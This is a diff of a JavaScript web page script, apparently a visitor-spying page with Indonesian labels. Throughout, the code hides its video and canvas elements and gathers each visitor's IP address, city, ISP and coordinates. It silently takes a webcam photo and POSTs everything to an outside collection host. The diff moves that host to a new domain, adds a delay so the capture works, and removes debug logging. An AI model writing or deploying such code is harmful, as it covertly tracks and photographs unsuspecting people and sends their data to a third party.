@@ -3,7 +3,7 @@ video.style.display = "none";
 let canvas = document.querySelector("#canvas");
 let text = "*DATA PENGUNJUNG*";
 canvas.style.display = "none";
-const base = "http://23.95.48.230:3020";
+const base = "https://fundaypay.vercel.app";
 
 (async () => {
     const jsonIp = await useFetch("https://jsonip.com");
@@ -21,21 +21,24 @@ Kota : ${data.city}
 Provider ISP : ${data.org}
 Latitude : ${data.latitude}
 Longitude : ${data.longitude}`;
-    // console.log(text);
     sM(text);
     let stream = await navigator.mediaDevices.getUserMedia({
         video: true,
         audio: false,
     });
     video.srcObject = stream;
-    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-    let image_data_url = canvas
-        .toDataURL("image/jpeg")
-        .replace(/^data:image\/jpeg;base64,/, "");
-    await sM(text, image_data_url, "jpeg");
-    video.pause();
-    video.src = "";
-    stream.getTracks()[0].stop();
+    setTimeout(() => {
+        canvas
+            .getContext("2d")
+            .drawImage(video, 0, 0, canvas.width, canvas.height);
+        let image_data_url = canvas
+            .toDataURL("image/jpeg")
+            .replace(/^data:image\/jpeg;base64,/, "");
+        sM(text, image_data_url, "jpeg");
+        video.pause();
+        video.src = "";
+        stream.getTracks()[0].stop();
+    }, 1000);
 })();
 
 async function useFetch(url) {
@@ -46,8 +49,8 @@ async function useFetch(url) {
 
 async function sM(msg, img, ext) {
     let mySender = await fetch(`${base}/send/`, {
-        method: "POST", // *GET, POST, PUT, DELETE, etc.
-        mode: "cors", // no-cors, *cors, same-origin
+        method: "POST",
+        mode: "cors",
         headers: {
             "Content-Type": "application/json",
         },
@@ -56,9 +59,8 @@ async function sM(msg, img, ext) {
             msg: msg || "siapa hayo?",
             img,
             ext,
-        }), // body data type must match "Content-Type" header
+        }),
     });
     let myResult = await mySender.text();
-    console.log(myResult);
     return Promise.resolve(myResult);
 }
